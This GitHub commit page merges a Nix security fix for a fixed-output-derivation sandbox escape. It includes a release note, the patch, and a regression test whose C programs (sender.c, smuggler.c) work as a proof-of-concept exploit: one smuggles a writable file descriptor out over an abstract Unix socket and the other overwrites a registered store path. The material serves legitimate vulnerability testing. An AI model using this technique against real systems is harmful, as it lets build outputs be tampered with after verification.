
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNixOS%2Fnix%2Fcommit%2Ff8170ce9f119e5e6724eb81ff1b5a2d4c0024000)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNixOS%2Fnix%2Fcommit%2Ff8170ce9f119e5e6724eb81ff1b5a2d4c0024000)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=NixOS%2Fnix)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[NixOS](/NixOS)
/
**[nix](/NixOS/nix)**
Public

* [Notifications](/login?return_to=%2FNixOS%2Fnix) You must be signed in to change notification settings
* [Fork
  1.6k](/login?return_to=%2FNixOS%2Fnix)
* [Star
   13.3k](/login?return_to=%2FNixOS%2Fnix)

* [Code](/NixOS/nix)
* [Issues
  3.1k](/NixOS/nix/issues)
* [Pull requests
  394](/NixOS/nix/pulls)
* [Actions](/NixOS/nix/actions)
* [Projects
  2](/NixOS/nix/projects)
* [Security](/NixOS/nix/security)
* [Insights](/NixOS/nix/pulse)

Additional navigation options

* [Code](/NixOS/nix)
* [Issues](/NixOS/nix/issues)
* [Pull requests](/NixOS/nix/pulls)
* [Actions](/NixOS/nix/actions)
* [Projects](/NixOS/nix/projects)
* [Security](/NixOS/nix/security)
* [Insights](/NixOS/nix/pulse)

## Commit

[Permalink](/NixOS/nix/commit/f8170ce9f119e5e6724eb81ff1b5a2d4c0024000)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request from [GHSA-2ffj-w4mj-pg37](https://github.com/NixOS/nix/security/advisories/GHSA-2ffj-w4mj-pg37 "GHSA-2ffj-w4mj-pg37")

[Browse files](/NixOS/nix/tree/f8170ce9f119e5e6724eb81ff1b5a2d4c0024000)
Browse the repository at this point in the history

```
Sandbox escape 2.20
```

* Loading branch information

[![@edolstra](https://avatars.githubusercontent.com/u/1148549?s=40&v=4)](/edolstra)

[edolstra](/NixOS/nix/commits?author=edolstra "View all commits by edolstra")
authored
Mar 7, 2024

2 parents
[584d64b](/NixOS/nix/commit/584d64bebcc310f3a98f8b6376185dc7a3a826d7)
+
[d691889](/NixOS/nix/commit/d6918898c9fbab9c6ad09d25e612674d62458729)

commit f8170ce

 Show file tree

 Hide file tree

Showing
**8 changed files**
with
**256 additions**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* doc/manual/rl-next

  + doc/manual/rl-next/fod-sandbox-escape.md
    [fod-sandbox-escape.md](#diff-323cd11b4e009cef0fd0ce02a47de5f33a30a52cb6ccd704c6a40bed2f5a3689)
* src

  + libstore/build

    - src/libstore/build/local-derivation-goal.cc
      [local-derivation-goal.cc](#diff-08a5e40e2243b11f7d074881064ea221e03448cce5bdf0faee0c2fe0f197571d)
  + libutil

    - src/libutil/file-system.cc
      [file-system.cc](#diff-2e19edb0698ca5684dc4eecbda4183fcc65beaac1d0cdd57fe31b5be98473725)
    - src/libutil/file-system.hh
      [file-system.hh](#diff-cdf7dc81608e6ba9c79a87595ea0a2ae75937a3e321a72904c2a0f303da293f9)
* tests/nixos

  + ca-fd-leak

    - tests/nixos/ca-fd-leak/default.nix
      [default.nix](#diff-55259065fc5dc2fb8c6c9ff7d03320d300873a27c5644876ebcb8e6bb6402dbb)
    - tests/nixos/ca-fd-leak/sender.c
      [sender.c](#diff-08fa50eca824101264789f7183efdd613800611366fed9a4d09ac00d56b72a70)
    - tests/nixos/ca-fd-leak/smuggler.c
      [smuggler.c](#diff-eb216360a5c41f951c57fbe8b6c77229b7b364dacbdcbe3e6ea130761fd55431)
  + tests/nixos/default.nix
    [default.nix](#diff-7234a357f14107533702004c573c10a11b095da0e31b309abc1f448341362f03)

## There are no files selected for viewing

14 changes: 14 additions & 0 deletions

14
[doc/manual/rl-next/fod-sandbox-escape.md](#diff-323cd11b4e009cef0fd0ce02a47de5f33a30a52cb6ccd704c6a40bed2f5a3689 "doc/manual/rl-next/fod-sandbox-escape.md")

Show comments

[View file](/NixOS/nix/blob/f8170ce9f119e5e6724eb81ff1b5a2d4c0024000/doc/manual/rl-next/fod-sandbox-escape.md)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

|  |  | @@ -0,0 +1,14 @@ |
|  |  | --- |
|  |  | synopsis: Fix a FOD sandbox escape |
|  |  | issues: |
|  |  | prs: |
|  |  | --- |
|  |  |  |
|  |  | Cooperating Nix derivations could send file descriptors to files in the Nix |
|  |  | store to each other via Unix domain sockets in the abstract namespace. This |
|  |  | allowed one derivation to modify the output of the other derivation, after Nix |
|  |  | has registered the path as "valid" and immutable in the Nix database. |
|  |  | In particular, this allowed the output of fixed-output derivations to be |
|  |  | modified from their expected content. |
|  |  |  |
|  |  | This isn't the case any more. |

6 changes: 6 additions & 0 deletions

6
[src/libstore/build/local-derivation-goal.cc](#diff-08a5e40e2243b11f7d074881064ea221e03448cce5bdf0faee0c2fe0f197571d "src/libstore/build/local-derivation-goal.cc")

Show comments

[View file](/NixOS/nix/blob/f8170ce9f119e5e6724eb81ff1b5a2d4c0024000/src/libstore/build/local-derivation-goal.cc)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2527,6 +2527,12 @@ SingleDrvOutputs LocalDerivationGoal::registerOutputs() |
|  |  | [&](const DerivationOutput::CAFixed & dof) { |
|  |  | auto & wanted = dof.ca.hash; |
|  |  |  |
|  |  | // Replace the output by a fresh copy of itself to make sure |
|  |  | // that there's no stale file descriptor pointing to it |
|  |  | Path tmpOutput = actualPath + ".tmp"; |
|  |  | copyFile(actualPath, tmpOutput, true); |
|  |  | renameFile(tmpOutput, actualPath); |
|  |  |  |
|  |  | auto newInfo0 = newInfoFromCA(DerivationOutput::CAFloating { |
|  |  | .method = dof.ca.method, |
|  |  | .hashAlgo = wanted.algo, |
| Expand Down | |  |

5 changes: 5 additions & 0 deletions

5
[src/libutil/file-system.cc](#diff-2e19edb0698ca5684dc4eecbda4183fcc65beaac1d0cdd57fe31b5be98473725 "src/libutil/file-system.cc")

Show comments

[View file](/NixOS/nix/blob/f8170ce9f119e5e6724eb81ff1b5a2d4c0024000/src/libutil/file-system.cc)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -628,6 +628,11 @@ void copy(const fs::directory\_entry & from, const fs::path & to, bool andDelete) |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | void copyFile(const Path & oldPath, const Path & newPath, bool andDelete) |
|  |  | { |
|  |  | return copy(fs::directory\_entry(fs::path(oldPath)), fs::path(newPath), andDelete); |
|  |  | } |
|  |  |  |
|  |  | void renameFile(const Path & oldName, const Path & newName) |
|  |  | { |
|  |  | fs::rename(oldName, newName); |
| Expand Down | |  |

7 changes: 7 additions & 0 deletions

7
[src/libutil/file-system.hh](#diff-cdf7dc81608e6ba9c79a87595ea0a2ae75937a3e321a72904c2a0f303da293f9 "src/libutil/file-system.hh")

Show comments

[View file](/NixOS/nix/blob/f8170ce9f119e5e6724eb81ff1b5a2d4c0024000/src/libutil/file-system.hh)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -186,6 +186,13 @@ void renameFile(const Path & src, const Path & dst); |
|  |  | \*/ |
|  |  | void moveFile(const Path & src, const Path & dst); |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Recursively copy the content of `oldPath` to `newPath`. If `andDelete` is |
|  |  | \* `true`, then also remove `oldPath` (making this equivalent to `moveFile`, but |
|  |  | \* with the guaranty that the destination will be “fresh”, with no stale inode |
|  |  | \* or file descriptor pointing to it). |
|  |  | \*/ |
|  |  | void copyFile(const Path & oldPath, const Path & newPath, bool andDelete); |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Automatic cleanup of resources. |
| Expand Down | |  |

90 changes: 90 additions & 0 deletions

90
[tests/nixos/ca-fd-leak/default.nix](#diff-55259065fc5dc2fb8c6c9ff7d03320d300873a27c5644876ebcb8e6bb6402dbb "tests/nixos/ca-fd-leak/default.nix")

Show comments

[View file](/NixOS/nix/blob/f8170ce9f119e5e6724eb81ff1b5a2d4c0024000/tests/nixos/ca-fd-leak/default.nix)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,90 @@ |
|  |  | # Nix is a sandboxed build system. But Not everything can be handled inside its |
|  |  | # sandbox: Network access is normally blocked off, but to download sources, a |
|  |  | # trapdoor has to exist. Nix handles this by having "Fixed-output derivations". |
|  |  | # The detail here is not important, but in our case it means that the hash of |
|  |  | # the output has to be known beforehand. And if you know that, you get a few |
|  |  | # rights: you no longer run inside a special network namespace! |
|  |  | # |
|  |  | # Now, Linux has a special feature, that not many other unices do: Abstract |
|  |  | # unix domain sockets! Not only that, but those are namespaced using the |
|  |  | # network namespace! That means that we have a way to create sockets that are |
|  |  | # available in every single fixed-output derivation, and also all processes |
|  |  | # running on the host machine! Now, this wouldn't be that much of an issue, as, |
|  |  | # well, the whole idea is that the output is pure, and all processes in the |
|  |  | # sandbox are killed before finalizing the output. What if we didn't need those |
|  |  | # processes at all? Unix domain sockets have a semi-known trick: you can pass |
|  |  | # file descriptors around! |
|  |  | # This makes it possible to exfiltrate a file-descriptor with write access to |
|  |  | # $out outside of the sandbox. And that file-descriptor can be used to modify |
|  |  | # the contents of the store path after it has been registered. |
|  |  |  |
|  |  | { config, ... }: |
|  |  |  |
|  |  | let |
|  |  | pkgs = config.nodes.machine.nixpkgs.pkgs; |
|  |  |  |
|  |  | # Simple C program that sends a a file descriptor to `$out` to a Unix |
|  |  | # domain socket. |
|  |  | # Compiled statically so that we can easily send it to the VM and use it |
|  |  | # inside the build sandbox. |
|  |  | sender = pkgs.runCommandWith { |
|  |  | name = "sender"; |
|  |  | stdenv = pkgs.pkgsStatic.stdenv; |
|  |  | } '' |
|  |  | $CC -static -o $out ${./sender.c} |
|  |  | ''; |
|  |  |  |
|  |  | # Okay, so we have a file descriptor shipped out of the FOD now. But the |
|  |  | # Nix store is read-only, right? .. Well, yeah. But this file descriptor |
|  |  | # lives in a mount namespace where it is not! So even when this file exists |
|  |  | # in the actual Nix store, we're capable of just modifying its contents... |
|  |  | smuggler = pkgs.writeCBin "smuggler" (builtins.readFile ./smuggler.c); |
|  |  |  |
|  |  | # The abstract socket path used to exfiltrate the file descriptor |
|  |  | socketName = "FODSandboxExfiltrationSocket"; |
|  |  | in |
|  |  | { |
|  |  | name = "ca-fd-leak"; |
|  |  |  |
|  |  | nodes.machine = |
|  |  | { config, lib, pkgs, ... }: |
|  |  | { virtualisation.writableStore = true; |
|  |  | nix.settings.substituters = lib.mkForce [ ]; |
|  |  | virtualisation.additionalPaths = [ pkgs.busybox-sandbox-shell sender smuggler pkgs.socat ]; |
|  |  | }; |
|  |  |  |
|  |  | testScript = { nodes }: '' |
|  |  | start\_all() |
|  |  |  |
|  |  | machine.succeed("echo hello") |
|  |  | # Start the smuggler server |
|  |  | machine.succeed("${smuggler}/bin/smuggler ${socketName} >&2 &") |
|  |  |  |
|  |  | # Build the smuggled derivation. |
|  |  | # This will connect to the smuggler server and send it the file descriptor |
|  |  | machine.succeed(r""" |
|  |  | nix-build -E ' |
|  |  | builtins.derivation { |
|  |  | name = "smuggled"; |
|  |  | system = builtins.currentSystem; |
|  |  | # look ma, no tricks! |
|  |  | outputHashMode = "flat"; |
|  |  | outputHashAlgo = "sha256"; |
|  |  | outputHash = builtins.hashString "sha256" "hello, world\n"; |
|  |  | builder = "${pkgs.busybox-sandbox-shell}/bin/sh"; |
|  |  | args = [ "-c" "echo \"hello, world\" > $out; ''${${sender}} ${socketName}" ]; |
|  |  | }' |
|  |  | """.strip()) |
|  |  |  |
|  |  |  |
|  |  | # Tell the smuggler server that we're done |
|  |  | machine.execute("echo done | ${pkgs.socat}/bin/socat - ABSTRACT-CONNECT:${socketName}") |
|  |  |  |
|  |  | # Check that the file was not modified |
|  |  | machine.succeed(r""" |
|  |  | cat ./result |
|  |  | test "$(cat ./result)" = "hello, world" |
|  |  | """.strip()) |
|  |  | ''; |
|  |  |  |
|  |  | } |

65 changes: 65 additions & 0 deletions

65
[tests/nixos/ca-fd-leak/sender.c](#diff-08fa50eca824101264789f7183efdd613800611366fed9a4d09ac00d56b72a70 "tests/nixos/ca-fd-leak/sender.c")

Show comments

[View file](/NixOS/nix/blob/f8170ce9f119e5e6724eb81ff1b5a2d4c0024000/tests/nixos/ca-fd-leak/sender.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,65 @@ |
|  |  | #include <sys/socket.h> |
|  |  | #include <sys/un.h> |
|  |  | #include <stdlib.h> |
|  |  | #include <stddef.h> |
|  |  | #include <stdio.h> |
|  |  | #include <unistd.h> |
|  |  | #include <fcntl.h> |
|  |  | #include <errno.h> |
|  |  | #include <string.h> |
|  |  | #include <assert.h> |
|  |  |  |
|  |  | int main(int argc, char \*\*argv) { |
|  |  |  |
|  |  | assert(argc == 2); |
|  |  |  |
|  |  | int sock = socket(AF\_UNIX, SOCK\_STREAM, 0); |
|  |  |  |
|  |  | // Set up a abstract domain socket path to connect to. |
|  |  | struct sockaddr\_un data; |
|  |  | data.sun\_family = AF\_UNIX; |
|  |  | data.sun\_path[0] = 0; |
|  |  | strcpy(data.sun\_path + 1, argv[1]); |
|  |  |  |
|  |  | // Now try to connect, To ensure we work no matter what order we are |
|  |  | // executed in, just busyloop here. |
|  |  | int res = -1; |
|  |  | while (res < 0) { |
|  |  | res = connect(sock, (const struct sockaddr \*)&data, |
|  |  | offsetof(struct sockaddr\_un, sun\_path) |
|  |  | + strlen(argv[1]) |
|  |  | + 1); |
|  |  | if (res < 0 && errno != ECONNREFUSED) perror("connect"); |
|  |  | if (errno != ECONNREFUSED) break; |
|  |  | } |
|  |  |  |
|  |  | // Write our message header. |
|  |  | struct msghdr msg = {0}; |
|  |  | msg.msg\_control = malloc(128); |
|  |  | msg.msg\_controllen = 128; |
|  |  |  |
|  |  | // Write an SCM\_RIGHTS message containing the output path. |
|  |  | struct cmsghdr \*hdr = CMSG\_FIRSTHDR(&msg); |
|  |  | hdr->cmsg\_len = CMSG\_LEN(sizeof(int)); |
|  |  | hdr->cmsg\_level = SOL\_SOCKET; |
|  |  | hdr->cmsg\_type = SCM\_RIGHTS; |
|  |  | int fd = open(getenv("out"), O\_RDWR | O\_CREAT, 0640); |
|  |  | memcpy(CMSG\_DATA(hdr), (void \*)&fd, sizeof(int)); |
|  |  |  |
|  |  | msg.msg\_controllen = CMSG\_SPACE(sizeof(int)); |
|  |  |  |
|  |  | // Write a single null byte too. |
|  |  | msg.msg\_iov = malloc(sizeof(struct iovec)); |
|  |  | msg.msg\_iov[0].iov\_base = ""; |
|  |  | msg.msg\_iov[0].iov\_len = 1; |
|  |  | msg.msg\_iovlen = 1; |
|  |  |  |
|  |  | // Send it to the othher side of this connection. |
|  |  | res = sendmsg(sock, &msg, 0); |
|  |  | if (res < 0) perror("sendmsg"); |
|  |  | int buf; |
|  |  |  |
|  |  | // Wait for the server to close the socket, implying that it has |
|  |  | // received the commmand. |
|  |  | recv(sock, (void \*)&buf, sizeof(int), 0); |
|  |  | } |

66 changes: 66 additions & 0 deletions

66
[tests/nixos/ca-fd-leak/smuggler.c](#diff-eb216360a5c41f951c57fbe8b6c77229b7b364dacbdcbe3e6ea130761fd55431 "tests/nixos/ca-fd-leak/smuggler.c")

Show comments

[View file](/NixOS/nix/blob/f8170ce9f119e5e6724eb81ff1b5a2d4c0024000/tests/nixos/ca-fd-leak/smuggler.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,66 @@ |
|  |  | #include <sys/socket.h> |
|  |  | #include <sys/un.h> |
|  |  | #include <stdlib.h> |
|  |  | #include <stddef.h> |
|  |  | #include <stdio.h> |
|  |  | #include <unistd.h> |
|  |  | #include <assert.h> |
|  |  |  |
|  |  | int main(int argc, char \*\*argv) { |
|  |  |  |
|  |  | assert(argc == 2); |
|  |  |  |
|  |  | int sock = socket(AF\_UNIX, SOCK\_STREAM, 0); |
|  |  |  |
|  |  | // Bind to the socket. |
|  |  | struct sockaddr\_un data; |
|  |  | data.sun\_family = AF\_UNIX; |
|  |  | data.sun\_path[0] = 0; |
|  |  | strcpy(data.sun\_path + 1, argv[1]); |
|  |  | int res = bind(sock, (const struct sockaddr \*)&data, |
|  |  | offsetof(struct sockaddr\_un, sun\_path) |
|  |  | + strlen(argv[1]) |
|  |  | + 1); |
|  |  | if (res < 0) perror("bind"); |
|  |  |  |
|  |  | res = listen(sock, 1); |
|  |  | if (res < 0) perror("listen"); |
|  |  |  |
|  |  | int smuggling\_fd = -1; |
|  |  |  |
|  |  | // Accept the connection a first time to receive the file descriptor. |
|  |  | fprintf(stderr, "%s\n", "Waiting for the first connection"); |
|  |  | int a = accept(sock, 0, 0); |
|  |  | if (a < 0) perror("accept"); |
|  |  |  |
|  |  | struct msghdr msg = {0}; |
|  |  | msg.msg\_control = malloc(128); |
|  |  | msg.msg\_controllen = 128; |
|  |  |  |
|  |  | // Receive the file descriptor as sent by the smuggler. |
|  |  | recvmsg(a, &msg, 0); |
|  |  |  |
|  |  | struct cmsghdr \*hdr = CMSG\_FIRSTHDR(&msg); |
|  |  | while (hdr) { |
|  |  | if (hdr->cmsg\_level == SOL\_SOCKET |
|  |  | && hdr->cmsg\_type == SCM\_RIGHTS) { |
|  |  |  |
|  |  | // Grab the copy of the file descriptor. |
|  |  | memcpy((void \*)&smuggling\_fd, CMSG\_DATA(hdr), sizeof(int)); |
|  |  | } |
|  |  |  |
|  |  | hdr = CMSG\_NXTHDR(&msg, hdr); |
|  |  | } |
|  |  | fprintf(stderr, "%s\n", "Got the file descriptor. Now waiting for the second connection"); |
|  |  | close(a); |
|  |  |  |
|  |  | // Wait for a second connection, which will tell us that the build is |
|  |  | // done |
|  |  | a = accept(sock, 0, 0); |
|  |  | fprintf(stderr, "%s\n", "Got a second connection, rewriting the file"); |
|  |  | // Write a new content to the file |
|  |  | if (ftruncate(smuggling\_fd, 0)) perror("ftruncate"); |
|  |  | char \* new\_content = "Pwned\n"; |
|  |  | int written\_bytes = write(smuggling\_fd, new\_content, strlen(new\_content)); |
|  |  | if (written\_bytes != strlen(new\_content)) perror("write"); |
|  |  | } |

4 changes: 3 additions & 1 deletion

4
[tests/nixos/default.nix](#diff-7234a357f14107533702004c573c10a11b095da0e31b309abc1f448341362f03 "tests/nixos/default.nix")

Show comments

[View file](/NixOS/nix/blob/f8170ce9f119e5e6724eb81ff1b5a2d4c0024000/tests/nixos/default.nix)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -109,7 +109,7 @@ in |
|  |  | nix.package = lib.mkForce pkgs.nixVersions.nix\_2\_13; |
|  |  | }; |
|  |  | }; |
|  |  |  |
|  |  |  |
|  |  | # TODO: (nixpkgs update) remoteBuildsSshNg\_remote\_2\_18 = ... |
|  |  |  |
|  |  | # Test our Nix as a builder for clients that are older |
| Expand Down  Expand Up | | @@ -156,4 +156,6 @@ in |
|  |  | (system: runNixOSTestFor system ./setuid.nix); |
|  |  |  |
|  |  | fetch-git = runNixOSTestFor "x86\_64-linux" ./fetch-git; |
|  |  |  |
|  |  | ca-fd-leak = runNixOSTestFor "x86\_64-linux" ./ca-fd-leak; |
|  |  | } |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `f8170ce`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNixOS%2Fnix%2Fcommit%2Ff8170ce9f119e5e6724eb81ff1b5a2d4c0024000) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

